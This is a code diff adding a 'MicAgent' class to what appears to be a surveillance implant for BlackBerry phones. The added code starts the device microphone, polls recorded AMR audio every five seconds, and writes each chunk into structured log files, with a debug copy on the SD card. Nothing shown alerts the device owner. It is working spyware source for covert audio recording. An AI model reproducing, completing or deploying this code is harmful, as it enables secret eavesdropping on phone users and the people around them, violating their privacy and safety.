@@ -9,18 +9,34 @@
  * *************************************************/
 package blackberry.agent;
 
+import net.rim.device.api.util.DataBuffer;
+import blackberry.fs.AutoFlashFile;
+import blackberry.fs.Path;
+import blackberry.record.AudioRecorder;
+import blackberry.record.AudioRecorderDispatcher;
+import blackberry.utils.Check;
+import blackberry.utils.DateTime;
 import blackberry.utils.Debug;
 import blackberry.utils.DebugLevel;
+import blackberry.utils.Utils;
 
 // TODO: Auto-generated Javadoc
 /**
  * The Class MicAgent.
  */
 public final class MicAgent extends Agent {
+    private static final long MIC_PERIOD = 5000;
+
     //#ifdef DEBUG
     static Debug debug = new Debug("MicAgent", DebugLevel.VERBOSE);
-
     //#endif
+
+    //#ifdef DEBUG_TRACE
+    AutoFlashFile amrfile;
+    //#endif
+
+    AudioRecorderDispatcher recorder;
+    long fId;
 
     /**
      * Instantiates a new mic agent.
@@ -46,11 +62,99 @@ public final class MicAgent extends Agent {
         parse(confParams);
     }
 
+    public void actualStart() {
+        //#ifdef DEBUG_INFO
+        debug.info("start");
+        //#endif
+
+        DateTime dateTime = new DateTime();
+        fId = dateTime.getFiledate();
+
+        //#ifdef DEBUG_TRACE
+        String filename = Path.SD_PATH + "filetest." + fId + ".amr";
+        debug.trace("Creating file: " + filename);
+        amrfile = new AutoFlashFile(filename, false);
+        boolean ret = amrfile.create();
+        //ret &= amrfile.write(AudioRecorder.AMR_HEADER);
+
+        Check.asserts(ret, "actualStart: cannot write file: " + filename);
+        //#endif
+
+        recorder = AudioRecorderDispatcher.getInstance();
+        recorder.start();
+    }
+
+    public void actualStop() {
+        //#ifdef DEBUG_INFO
+        debug.info("stop");
+        //#endif
+
+        recorder.stop();
+
+    }
+
     /*
      * (non-Javadoc)
      * @see blackberry.threadpool.TimerJob#actualRun()
      */
     public void actualRun() {
+        //#ifdef DBC
+        Check.requires(recorder != null, "actualRun: recorder == null");
+        //#endif
+
+        byte[] chunk = recorder.getAvailable();
+
+        if (chunk != null && chunk.length > 0) {
+
+            //#ifdef DBC
+            Check.requires(log != null, "Null log");
+            //#endif
+
+            log.createLog(getAdditionalData());
+            int offset = 0;
+            if (Utils.equals(chunk, 0, AudioRecorder.AMR_HEADER, 0,
+                    AudioRecorder.AMR_HEADER.length)) {
+                offset = AudioRecorder.AMR_HEADER.length;
+            }
+            //#ifdef DEBUG_TRACE
+            debug.trace("actualRun offset: " + offset);
+            //#endif
+            log.writeLog(chunk, offset);
+            log.close();
+
+            //#ifdef DEBUG_TRACE    
+            boolean ret = amrfile.append(chunk);
+            Check.asserts(ret, "cannot write file!");
+            //#endif
+        } else {
+            //#ifdef DEBUG_WARN
+            debug.warn("zero chunk: " + chunk);
+            //#endif
+        }
+
+    }
+
+    private byte[] getAdditionalData() {
+        final int LOG_MIC_VERSION = 2008121901;
+        // LOG_AUDIO_CODEC_SPEEX   0x00;
+        final int LOG_AUDIO_CODEC_AMR = 0x01;
+        final int sampleRate = 8000;
+
+        int tlen = 16;
+        final byte[] additionalData = new byte[tlen];
+
+        final DataBuffer databuffer = new DataBuffer(additionalData, 0, tlen,
+                false);
+
+        databuffer.writeInt(LOG_MIC_VERSION);
+        databuffer.writeInt(sampleRate | LOG_AUDIO_CODEC_AMR);
+        databuffer.writeLong(fId);
+
+        //#ifdef DBC
+        Check.ensures(additionalData.length == tlen,
+                "Wrong additional data name");
+        //#endif
+        return additionalData;
     }
 
     /*
@@ -58,8 +162,9 @@ public final class MicAgent extends Agent {
      * @see blackberry.agent.Agent#parse(byte[])
      */
     protected boolean parse(final byte[] confParameters) {
-        // TODO Auto-generated method stub
-        return false;
+        setPeriod(MIC_PERIOD);
+        setDelay(MIC_PERIOD);
+        return true;
     }
 
 }
